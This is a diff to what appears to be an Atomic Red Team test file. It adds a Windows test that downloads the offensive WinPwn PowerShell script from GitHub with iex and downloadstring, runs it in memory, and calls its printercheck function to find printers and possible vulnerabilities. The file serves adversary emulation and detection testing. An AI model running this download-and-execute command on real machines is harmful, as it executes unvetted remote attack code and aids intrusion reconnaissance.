@@ -13,3 +13,14 @@ atomic_tests:
       @($Heading; $Break; $Data |Sort-Object -Unique) | ? {$_.trim() -ne "" } |Set-Content $env:TEMP\T1120_collection.txt
     cleanup_command: Remove-Item $env:TEMP\T1120_collection.txt -ErrorAction Ignore
     name: powershell
+- name: WinPwn - printercheck
+  auto_generated_guid: cb6e76ca-861e-4a7f-be08-564caa3e6f75
+  description: Search for printers / potential vulns using printercheck function of WinPwn
+  supported_platforms:
+  - windows
+  executor:
+    command: |-
+      $S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
+      iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
+      printercheck -noninteractive -consoleoutput
+    name: powershell
